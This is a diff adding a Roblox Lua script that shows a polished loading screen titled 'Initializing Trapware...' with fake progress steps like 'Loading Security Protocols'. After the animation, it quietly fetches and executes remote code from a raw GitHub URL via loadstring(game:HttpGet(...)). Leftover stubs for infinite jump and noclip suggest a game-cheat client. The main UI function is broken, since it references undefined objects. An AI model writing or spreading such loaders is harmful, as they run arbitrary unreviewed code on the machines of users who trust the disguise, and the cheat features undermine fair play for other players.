@@ -1,0 +1,121 @@
+local player = game:GetService("Players").LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+-- Loading Screen Setup
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "LoadingScreen"
+loadingGui.ResetOnSpawn = false
+loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local loadFrame = Instance.new("Frame")
+loadFrame.Size = UDim2.new(0, 400, 0, 150)
+loadFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
+loadFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+loadFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+Instance.new("UICorner", loadFrame).CornerRadius = UDim.new(0, 12)
+
+local loadText = Instance.new("TextLabel")
+loadText.Text = "Initializing Trapware..."
+loadText.Font = Enum.Font.GothamBold
+loadText.TextSize = 18
+loadText.TextColor3 = Color3.fromRGB(200, 200, 200)
+loadText.Size = UDim2.new(1, -40, 0, 30)
+loadText.Position = UDim2.new(0, 20, 0, 20)
+loadText.BackgroundTransparency = 1
+
+local progressBack = Instance.new("Frame")
+progressBack.Size = UDim2.new(1, -40, 0, 8)
+progressBack.Position = UDim2.new(0, 20, 0, 60)
+progressBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+Instance.new("UICorner", progressBack).CornerRadius = UDim.new(1, 0)
+
+local progressFill = Instance.new("Frame")
+progressFill.Size = UDim2.new(0, 0, 1, 0)
+progressFill.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+Instance.new("UICorner", progressFill).CornerRadius = UDim.new(1, 0)
+
+local percentText = Instance.new("TextLabel")
+percentText.Text = "0%"
+percentText.Font = Enum.Font.Gotham
+percentText.TextSize = 14
+percentText.TextColor3 = Color3.fromRGB(150, 150, 150)
+percentText.Size = UDim2.new(0, 60, 0, 20)
+percentText.Position = UDim2.new(1, -80, 0, 85)
+percentText.BackgroundTransparency = 1
+
+-- Assemble loading screen
+progressFill.Parent = progressBack
+progressBack.Parent = loadFrame
+loadText.Parent = loadFrame
+percentText.Parent = loadFrame
+loadFrame.Parent = loadingGui
+loadingGui.Parent = playerGui
+
+-- Loading steps
+local loadSteps = {
+    {"Initializing Core Modules", 0.8},
+    {"Loading Security Protocols", 1.0},
+    {"Preparing User Interface", 1.2},
+    {"Compiling Feature Modules", 1.5},
+    {"Optimizing Performance", 0.7},
+    {"Finalizing Initialization", 0.5}
+}
+
+-- Main initialization function
+local function initializeMainUI()
+    local success, err = pcall(function()
+        -- Your original UI code starts here
+        local infiniteJumpEnabled = false
+        local noclipEnabled = false
+        local noclipConnection = nil
+
+
+        -- Finally enable the main UI
+        screenGui.Enabled = true
+        mainFrame.Size = UDim2.new(0, 0, 0, 0)
+        TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+            Size = UDim2.new(0, 400, 0, 300)
+        }):Play()
+    end)
+
+    if not success then
+        loadText.Text = "Initialization Failed!"
+        progressFill.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+        percentText.TextColor3 = Color3.fromRGB(255, 50, 50)
+        warn("Loading failed: "..tostring(err))
+    end
+end
+-- Animated loading sequence
+task.spawn(function()
+    local totalSteps = #loadSteps
+    local currentProgress = 0
+    
+    for i, step in ipairs(loadSteps) do
+        local stepName, stepDuration = unpack(step)
+        loadText.Text = stepName
+        percentText.Text = string.format("%d%%", math.floor((i/totalSteps)*100))
+        
+        local targetWidth = (i/totalSteps) * (progressBack.AbsoluteSize.X)
+        TweenService:Create(progressFill, TweenInfo.new(stepDuration), {
+            Size = UDim2.new(0, targetWidth, 1, 0)
+        }):Play()
+        wait(stepDuration)
+    end
+    
+    -- Fade out loading screen
+    TweenService:Create(loadFrame, TweenInfo.new(0.3), {
+        BackgroundTransparency = 1,
+        Position = UDim2.new(0.5, -200, 0.5, -50)
+    }):Play()
+
+    wait(0.3)
+    loadingGui:Destroy()
+    
+    -- Execute loadstring after loading completes
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MADMONEYDISTRO/madmoney-ghost-client/refs/heads/main/sad"))()
+    
+    -- Initialize main UI after loading
+    initializeMainUI()
+end)
